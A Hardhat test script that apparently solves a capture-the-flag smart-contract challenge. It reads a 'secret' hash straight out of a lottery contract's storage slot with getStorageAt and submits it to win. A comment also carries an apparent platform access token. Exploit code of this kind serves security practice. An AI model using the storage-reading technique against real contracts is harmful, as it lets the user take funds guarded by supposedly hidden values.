import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

// token: v4.local.MzDhV45CAVBzBTSXkhB0_pVVg3PuIljYCCa2NKpveUCIKx53hJePgxkPlES4gFRBb4Z8KJ-povQASQrlIdHrn0rSWGEZjFqUNGPp9cB3Ke2CP9TtEkOPO6kTHqH-Y-lJkOaaRnGRs2rDR0W5RhSz_R-NEv0rYqOJhp2WGxIn8r-zjg
describe("onChainLottery", function () {
    let signer: Signer;
    let player: string;
    let challengeFactory: ContractFactory;
    let challenge: Contract;
    let challenge_instance_address = "0xFBf096554390f99fAf4940E5E85baaA662271662";

    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);
        challengeFactory = await ethers.getContractFactory("onChainLotterySecuredx20000");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        // Setting our secret hash:
        try {
            const settupMaHashTx = await challenge.setupMaHash({
                gasLimit: 100000
            });
            const settupMaHashReceipt = await settupMaHashTx.wait();
            console.log("Hash setup complete...");
        } catch (e) {
            console.log("Hash setup was already done previously...")
        }

        const helperFactory = await ethers.getContractFactory("onChainLotterySecuredx20000Helper");
        const helper = await helperFactory.deploy();
        await helper.deployed();

        // Getting the location using the following formula:
        // keccak256(bytes32(key) + bytes32(position));
        const storageLocation = await helper.getStorageLocation();
        const storageLocationStr = BigNumber.from(storageLocation).toString();
        console.log("Storage Location:", storageLocationStr);

        // Checking the storage at the given location:
        const provider = signer.provider!;
        const hash = await provider.getStorageAt(challenge.address, storageLocation);

        console.log("Found hash:", BigNumber.from(hash).toString())
        console.log("Converting to uint and checking if hash is valid...");
        // Checking if hash corresponds with value:
        try {
            const checkHashTx = await challenge.trynaGuessMyhash(BigNumber.from(hash).toBigInt());
            const checkHashReceipt = await checkHashTx.wait();
        } catch (e) {
            console.log("Hash was not valid...");
            process.exit();
        }

        // Checking if challenge solved:
        const isSolved = await challenge.isSolved();
        expect(isSolved).to.equal(true);
    });
});